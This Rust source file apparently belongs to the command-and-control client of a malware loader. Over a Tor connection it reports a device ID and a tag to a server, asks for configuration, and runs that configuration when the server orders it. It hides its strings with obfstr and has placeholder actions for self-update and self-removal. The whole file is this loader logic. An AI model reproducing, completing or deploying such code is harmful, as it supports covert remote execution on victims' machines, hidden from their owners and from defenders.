use std::sync::Arc;
use anyhow::{ Context, Result };
use loader_vars::{
    constants::{ loader_tag, loader_version },
    types::{ receive::{ self, ClPrms, LdrRcv }, send::{ GtCnfgPrms, LdrSnd, SrvAct, SrvPrms } },
};
use shared::{
    network::tor::{ LoggerCnfg, MutexPtr, RwPtr, SrvRcvTp, TrHandler },
    utils::config::load_mib_config,
};
use obfstr::obfstr as s;
use tokio::sync::{ Mutex, RwLock };
use super::utils::run_config;

#[derive(Clone)]
pub struct LdrTrHandler {
    tr_handler: TrHandler,
    cnfg_done: MutexPtr<bool>,
}

impl LdrTrHandler {
    pub async fn new(logger_config: LoggerCnfg) -> Result<Self> {
        let tor_handler = TrHandler::new(logger_config).await?;
        let config_executed = Arc::new(Mutex::new(false));
        Ok(LdrTrHandler { tr_handler: tor_handler, cnfg_done: config_executed })
    }

    pub async fn run_handler(&mut self) {
        let self_clone = Arc::new(RwLock::new(self.clone()));
        let self_clone2 = self_clone.clone();

        // std::thread::spawn(move || {
        //     std::thread::sleep(Duration::from_secs(60 * 10));
        //     let binding = self_clone3.write().unwrap();
        //     let mut run_config_done = binding.cnfg_done.lock().unwrap();
        //     if !*run_config_done {
        //         run_config(RnCnfgPrms::default()).unwrap();
        //         *run_config_done = true;
        //     }
        // });

        self.tr_handler.run(
            move || {
                Self::connect_callback_init(self_clone.clone());
            },
            move |handler, data| { Self::process_data(handler.clone(), data, self_clone2.clone()) }
        ).await;
    }
    pub async fn connect_callback_init(self_ref: RwPtr<Self>) {
        let mib_config = load_mib_config(false).unwrap();
        let params = GtCnfgPrms { tag: loader_tag(), mib_config };

        if
            let Err(_error) = Self::send_data(
                &self_ref.read().await.tr_handler,
                SrvAct::GtCnfg,
                SrvPrms::GtCnfg(params)
            )
        {
            // err
        }
    }

    async fn process_data(
        tor_handler: TrHandler,
        binary_data: Vec<u8>,
        self_ref: RwPtr<Self>
    ) -> Result<()> {
        let processed_data: LdrRcv = serde_json
            ::from_slice(&binary_data)
            .context(s!("Failed to parse binary data as LoaderReceivePayload").to_string())?;

        Self::route_data(tor_handler, processed_data, self_ref).await
    }

    async fn route_data(
        _tor_handler: TrHandler,
        processed_data: LdrRcv,
        self_ref: RwPtr<Self>
    ) -> Result<()> {
        match processed_data.action {
            receive::ClAct::RnCnfg => {
                if let ClPrms::RnCnfg(params) = processed_data.params {
                    if let Ok(()) = run_config(params) {
                        let binding = self_ref.write().await;
                        let mut run_config_done = binding.cnfg_done.lock().unwrap();
                        *run_config_done = true;
                    }
                } else {
                    return Err(
                        anyhow::anyhow!(
                            format!("{}{:#?}", s!("Invalid params for: "), processed_data.action)
                        )
                    );
                }
            }
            receive::ClAct::UnsSlf => {}
            receive::ClAct::UpdSlf => {}
        }
        Ok(())
    }
    async fn send_data(tor_handler: &TrHandler, action: SrvAct, params: SrvPrms) -> Result<()> {
        let payload = LdrSnd {
            id: tor_handler.dv_id.read().await.to_owned(),
            version: loader_version(),
            action,
            params,
        };

        let binary_data = serde_json
            ::to_vec(&payload)
            .context(s!("Failed to serialize ServerReceive struct to binary data").to_string())?;

        tor_handler.add_to_send_queue(SrvRcvTp::Ldr, binary_data).await
    }
}
